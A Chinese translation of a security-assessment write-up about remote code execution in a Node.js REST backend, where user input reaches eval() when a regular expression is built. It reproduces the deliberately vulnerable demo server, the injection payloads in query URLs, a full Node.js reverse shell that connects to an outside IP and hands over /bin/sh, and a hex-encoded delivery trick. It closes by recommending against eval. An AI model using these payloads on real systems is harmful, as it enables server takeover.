> 原文链接: https://www.anquanke.com//post/id/83988 


# Node.js应用中的逆向Shell


                                阅读量   
                                **79517**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：360安全播报
                                <br>原文地址：[https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/](https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p2.ssl.qhimg.com/t0196424f0de59f8503.jpg)](https://p2.ssl.qhimg.com/t0196424f0de59f8503.jpg)

我们如何在安全评估活动中利用Node.js应用程序中的漏洞来获取JavaScript逆向Shell呢?

介绍

在此之前,一个小型的web开发团队曾委托我们对他们移动应用程序的后台服务进行安全评估。值得一提的是,该后台程序的API(应用程序编程接口)开发全部遵循的是Rest风格。REST全称为REpresentational State Transfer,即表述性状态转移。REST指的是一组架构约束条件和原则,满足这些约束条件和原则而设计开发出来的应用程序编程接口就是REST API。REST并不是一种新兴的什么技术语言,也不是什么新的框架,而是一种概念、风格或者约束。

这种框架结构实际上是非常简洁的,整个架构中只需要使用三台Linux服务器。

-Node.js(一个Javascript运行环境)

-MongoDB(一个基于分布式文件存储的数据库)

-Redis(一个开源的Key-Value数据库)

首先,我们在无法访问到程序源代码的情况下对程序后台进行了一些随机测试。我们发现,如果在后台应用程序的某些数据输入接口中输入一些特殊字符时,将会引起程序的意外崩溃。

除此之外我们还注意到,我们可以在不经过身份验证的情况下从外网访问到应用程序的Redis服务器。

接下来,我们的任务就是对Node.js的应用程序编程接口代码进行安全审查,并找出引起程序崩溃的原因。

对存在漏洞的应用程序进行简化

我们创建出了这个小型的Node.js应用程序,该程序中同样含有存在漏洞的功能函数。如果用户想要尝试去利用这一漏洞,那么可以使用这一应用程序来进行测试。

Node.js网站服务器会等待类似[http://target.tld//?name=do*](http://target.tld/?name=do*)的查询语句传入服务器,并在网站数据库中搜索与查询语句中“name”参数相匹配的数据条目。

```
'use strict'
const http = require('http');
const url = require('url');
const path = require('path');
const animalsJSON = path.join(__dirname, 'animals.json');
const animals = require(animalsJSON);
function requestHandler(req, res) `{`
    let urlParams = url.parse(req.url, true);
    let queryData = urlParams.query;
    res.writeHead(200, `{`"Content-Type": "application/json"`}`);
    if (queryData.name) `{`
        let searchQuery = stringToRegexp(queryData.name);
        let animalsResult = getAnimals(searchQuery);
        res.end(JSON.stringify(animalsResult));
    `}` else `{`
        res.end();
    `}`
`}`
function getAnimals(query) `{`
    let result = [];
    for (let animal of animals) `{`
        if (query.test(animal.name))
            result.push(animal);
    `}`
    return result;
`}`
function stringToRegexp(input) `{`
    let output = input.replace(/[[]\^$.|?+()]/, "\$&amp;");
    let prefix, suffix;
    if (output[0] == '*') `{`
        prefix = '/';
        output = output.replace(/^*+/g, '');
    `}` else `{`
        prefix = '/^';
    `}`
    if (output[output.length - 1] == '*') `{`
        suffix = '/i';
        output = output.replace(/*+$/g, '');
    `}` else `{`
        suffix = '$/i';
    `}`
    output = output.replace(/[*]/, '.*');
    return eval(prefix + output + suffix);
`}`
const server = http.createServer(requestHandler);
server.listen(3000);
[
    `{`"name": "Dinosaur"`}`,
    `{`"name": "Dog"`}`,
    `{`"name": "Dogfish"`}`,
    `{`"name": "Dolphin"`}`,
    `{`"name": "Donkey"`}`,
    `{`"name": "Dotterel"`}`,
    `{`"name": "Dove"`}`,
    `{`"name": "Dragonfly"`}`,
    `{`"name": "Duck"`}`
]
```

漏洞信息

在我们的安全研究人员对代码中存在漏洞的地方进行了几分钟的分析测试之后,我们注意到了一个明显带有设计缺陷的地方,而这个问题将会直接导致攻击者能够实现远程代码执行。

stringToRegexp函数会创建出一个RegExp对象(正则表达式对象)来对用户的输入数据进行检测,并利用这个正则表达式对象来搜索数组中的有效数据元素。

```
return eval(prefix + output + suffix); // 我们在这里需要控制函数的返回值
```

我们可以在output变量中插入并执行我们的JavaScript代码。

stringToRegexp函数可以过滤掉数据中的某些特殊字符,并且对output变量的值进行审查。

```
["./;require('util').log('Owned');//*"]
```

当我们使用浏览器访问下方列出的网站地址之后,系统将会在服务器的终端打印一条信息。

```
http://target.tld/?name=["./;require('util').log('Owned');//*"]
```

通过这样的方法,我们就可以执行代码,并获取到服务器的交互Shell(例如/bin/sh)。

Node.js逆向Shell

下方所显示的JavaScript代码就是一个Node.js逆向Shell。

代码中的Payload将会生成一个/bin/sh Shell,并允许攻击者与目标服务器创建一条TCP链接,然后在通信数据流中绑定shell命令。

```
(function()`{`
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(8080, "10.17.26.64", function()`{`
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    `}`);
    return /a/; // 防止Node.js应用程序崩溃
`}`)();
```

为了有效地运行我们的Payload,我们使用了一个小技巧。我们将逆向Shell Payload编码成了十六进制格式,并且使用了Node.js的Buffer对象来对其进行解码操作。

http://target.tld/?name=["./;eval(new Buffer('PAYLOAD', 'hex').toString());//*"]

总结

在得到了上述的分析结果之后,我们强烈建议用户尽量避免在JavaScript项目中使用eval函数。对应的解决方案也十分简单,用户可以直接使用RegExp对象来对数据进行操作。
